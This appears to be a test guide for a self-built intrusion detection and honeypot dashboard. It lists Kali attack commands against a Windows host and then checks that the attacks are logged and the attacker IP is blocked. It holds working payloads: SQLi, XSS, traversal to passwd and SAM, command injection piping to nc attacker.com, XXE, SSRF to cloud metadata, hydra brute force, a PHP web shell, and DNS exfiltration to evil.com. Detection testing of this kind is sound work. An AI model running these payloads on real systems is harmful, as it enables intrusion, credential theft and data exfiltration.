# Attack Test Commands - Kali → Windows

**Target:** WINDOWS_IP  
**Attacker:** KALI_IP (Kali)

---

## ⚠️ IMPORTANT: Windows PowerShell Users

**If running these commands FROM Windows PowerShell** (instead of from Kali), replace all `curl` with `curl.exe`:

```powershell
# ❌ WRONG (PowerShell alias - causes errors):
curl -k "https://WINDOWS_IP:60000/api/threats?id=1"

# ✅ CORRECT (actual curl binary):
curl.exe -k "https://WINDOWS_IP:60000/api/threats?id=1"
```

**Reason:** PowerShell's `curl` is an alias for `Invoke-WebRequest`, not the actual curl binary. Use `curl.exe` to call the real curl command.

**For Kali Linux:** All commands work as-is with `curl` (no `.exe` needed).

---

## 0. Windows Preparation (Run as Administrator)

**Before running attacks, enable ICMP on Windows:**

```powershell
# Run PowerShell as Administrator, then execute:
New-NetFirewallRule -DisplayName "Allow ICMPv4 Ping (Testing)" -Direction Inbound -Protocol ICMPv4 -IcmpType 8 -Action Allow -Profile Any -Enabled True
```

This allows ping testing between Kali and Windows.

---

## 1. Honeypot Tests (Ports 2121, 2222, 2323, 3306, 8080)

### SSH Honeypot (Port 2222)
```bash
# Basic connection
telnet WINDOWS_IP 2222

# SSH brute force simulation
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://WINDOWS_IP:2222 -t 4

# Netcat connection
nc WINDOWS_IP 2222

# Nmap scan
nmap -p 2222 -sV WINDOWS_IP
```

### FTP Honeypot (Port 2121)
```bash
telnet WINDOWS_IP 2121

# FTP brute force
hydra -l ftp -P /usr/share/wordlists/rockyou.txt ftp://WINDOWS_IP:2121

nc WINDOWS_IP 2121
```

### Telnet Honeypot (Port 2323)
```bash
telnet WINDOWS_IP 2323

nc WINDOWS_IP 2323
```

### MySQL Honeypot (Port 3306)
```bash
nc WINDOWS_IP 3306

# MySQL connection attempt
mysql -h WINDOWS_IP -P 3306 -u root -p
```

---

## 2. Web Application Attacks (Port 60000 - Dashboard)

### SQL Injection
```bash
# Test 1: Classic SQLi
curl -k "https://WINDOWS_IP:60000/api/threats?id=1' OR '1'='1"

# Test 2: UNION attack (using # for SQL comment - works on all platforms)
curl -k "https://WINDOWS_IP:60000/api/alerts?id=1 UNION SELECT * FROM users#"

# Test 3: Time-based blind
curl -k "https://WINDOWS_IP:60000/api/reports?id=1' AND SLEEP(5)#"

# Test 4: Boolean-based
curl -k "https://WINDOWS_IP:60000/api/data?filter=admin' AND 1=1#"
```

### XSS (Cross-Site Scripting)
```bash
# Test 1: Reflected XSS
curl -k 'https://WINDOWS_IP:60000/api/search?q=<script>alert(1)</script>'

# Test 2: DOM XSS
curl -k 'https://WINDOWS_IP:60000/api/alerts?msg=<img src=x onerror=alert(1)>'

# Test 3: Stored XSS
curl -k -X POST 'https://WINDOWS_IP:60000/api/comments' -d 'comment=<script>document.cookie</script>'
```

### Path Traversal
```bash
# Test 1: Linux path traversal
curl -k 'https://WINDOWS_IP:60000/api/files?path=../../../../etc/passwd'

# Test 2: Windows path traversal
curl -k 'https://WINDOWS_IP:60000/api/download?file=..\..\..\windows\system32\config\sam'

# Test 3: Encoded traversal
curl -k 'https://WINDOWS_IP:60000/api/logs?log=..%2F..%2F..%2Fetc%2Fpasswd'
```

### Command Injection
```bash
# Test 1: Basic command injection
curl -k 'https://WINDOWS_IP:60000/api/ping?host=127.0.0.1;%20whoami'

# Test 2: Piped commands
curl -k 'https://WINDOWS_IP:60000/api/exec?cmd=ls%20|%20nc%20attacker.com%204444'

# Test 3: Backtick execution
curl -k 'https://WINDOWS_IP:60000/api/utils?input=`id`'
```

### LDAP Injection
```bash
# LDAP injection with special characters
curl -k 'https://WINDOWS_IP:60000/api/login?username=admin*)(&(password=*'

curl -k 'https://WINDOWS_IP:60000/api/auth?user=*)(uid=*))(&(uid=*'
```

### XXE (XML External Entity)
```bash
curl -k -X POST "https://WINDOWS_IP:60000/api/xml" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>'
```

### SSRF (Server-Side Request Forgery)
```bash
curl -k "https://WINDOWS_IP:60000/api/fetch?url=http://169.254.169.254/latest/meta-data/"

curl -k "https://WINDOWS_IP:60000/api/webhook?callback=http://localhost:22"
```

---

## 3. Brute Force Attacks

### Login Brute Force
```bash
# Test 1: Multiple failed logins (triggers brute force detection)
for i in {1..20}; do
  curl -k -X POST "https://WINDOWS_IP:60000/api/login" \
    -d "username=admin&password=wrong$i"
  sleep 0.5
done

# Test 2: Credential stuffing
hydra -l admin -P /usr/share/wordlists/rockyou.txt WINDOWS_IP https-post-form "/api/login:username=^USER^&password=^PASS^:Invalid"
```

---

## 4. Port Scanning (Triggers Port Scan Detection)

```bash
# Full TCP scan
nmap -sT -p- WINDOWS_IP

# SYN scan (stealth)
sudo nmap -sS -p 1-10000 WINDOWS_IP

# Version detection
nmap -sV -p 60000,2222,2323,2121 WINDOWS_IP

# OS detection
sudo nmap -O WINDOWS_IP

# Aggressive scan
nmap -A -T4 WINDOWS_IP

# Masscan (very fast)
sudo masscan -p1-65535 WINDOWS_IP --rate=1000
```

---

## 5. Rate Limit Abuse

```bash
# Rapid requests (100 in 10 seconds)
for i in {1..100}; do
  curl -k "https://WINDOWS_IP:60000/api/threats" &
done
wait

# Scraping attempt
for i in {1..50}; do
  curl -k "https://WINDOWS_IP:60000/api/data?page=$i"
done
```

---

## 6. Malicious User-Agent

```bash
# Sqlmap user agent
curl -k -A "sqlmap/1.0" "https://WINDOWS_IP:60000/api/threats"

# Nikto scanner
curl -k -A "Nikto/2.1.6" "https://WINDOWS_IP:60000/"

# Nmap scripting
curl -k -A "Mozilla/5.0 (compatible; Nmap Scripting Engine)" "https://WINDOWS_IP:60000/"

# Metasploit
curl -k -A "Metasploit" "https://WINDOWS_IP:60000/api/alerts"

# Burp Suite
curl -k -A "Mozilla/5.0 (compatible; BurpSuite)" "https://WINDOWS_IP:60000/"
```

---

## 7. HTTP Method Abuse

```bash
# TRACE method (XST attack)
curl -k -X TRACE "https://WINDOWS_IP:60000/api/threats"

# PUT upload
curl -k -X PUT "https://WINDOWS_IP:60000/api/files/shell.php" -d "<?php system(\$_GET['cmd']); ?>"

# DELETE method
curl -k -X DELETE "https://WINDOWS_IP:60000/api/data/important"

# OPTIONS enumeration
curl -k -X OPTIONS "https://WINDOWS_IP:60000/api/admin" -v
```

---

## 8. File Upload Exploit

```bash
# PHP shell upload
curl -k -X POST "https://WINDOWS_IP:60000/api/upload" \
  -F "file=@shell.php" \
  -F "filename=shell.php"

# Double extension
curl -k -X POST "https://WINDOWS_IP:60000/api/upload" \
  -F "file=@malware.php.jpg"

# Null byte injection
curl -k -X POST "https://WINDOWS_IP:60000/api/upload" \
  -F "file=@shell.php%00.jpg"
```

---

## 9. DNS Tunneling

```bash
# Exfiltrate data via DNS
dig @WINDOWS_IP "secret-data-here.attacker.com"

# Multiple DNS queries (suspicious pattern)
for i in {1..50}; do
  dig @WINDOWS_IP "tunnel-$i.evil.com"
done
```

---

## Verification Commands (Run on Windows)

After running attacks from Kali, verify on Windows:

```powershell
# 1. Check blocked IPs
cat server\json\blocked_ips.json

# 2. Check threat log
cat server\json\threat_log.json | Select-Object -Last 20

# 3. Check honeypot attacks
cat server\json\honeypot_attacks.json

# 4. Verify Kali IP is blocked
cat server\json\blocked_ips.json | Select-String "KALI_IP"

# 5. Check patterns extracted
cat server\json\honeypot_patterns.json

# 6. View real-time logs (if server running)
# Watch terminal output for [IP BLOCKING] messages
```

---

## Expected Results

✅ **For EACH attack above:**
1. Threat logged in `threat_log.json` or `honeypot_attacks.json`
2. Kali IP (KALI_IP) added to `blocked_ips.json`
3. Pattern extracted (sanitized, no exploit code)
4. Pattern sent to relay (if relay enabled)
5. Real-time console output showing block

❌ **NOT in logs/relay:**
- Attacker IP addresses
- Raw exploit code
- Full attack payloads

---

## Quick All-In-One Test

```bash
#!/bin/bash
# Run multiple attacks sequentially

echo "=== Testing Honeypot ==="
nc -w 2 WINDOWS_IP 2222

echo "=== Testing SQL Injection ==="
curl -k "https://WINDOWS_IP:60000/api/threats?id=1' OR '1'='1"

echo "=== Testing XSS ==="
curl -k 'https://WINDOWS_IP:60000/api/search?q=<script>alert(1)</script>'

echo "=== Testing Path Traversal ==="
curl -k 'https://WINDOWS_IP:60000/api/files?path=../../../../etc/passwd'

echo "=== Testing Port Scan ==="
nmap -p 60000,2222,2323 WINDOWS_IP

echo "=== Testing Brute Force ==="
for i in {1..10}; do
  curl -k -X POST "https://WINDOWS_IP:60000/api/login" -d "username=admin&password=test$i"
done

echo "=== Testing Complete - Check Windows logs ==="
```

Save as `test_attacks.sh` and run: `chmod +x test_attacks.sh && ./test_attacks.sh`
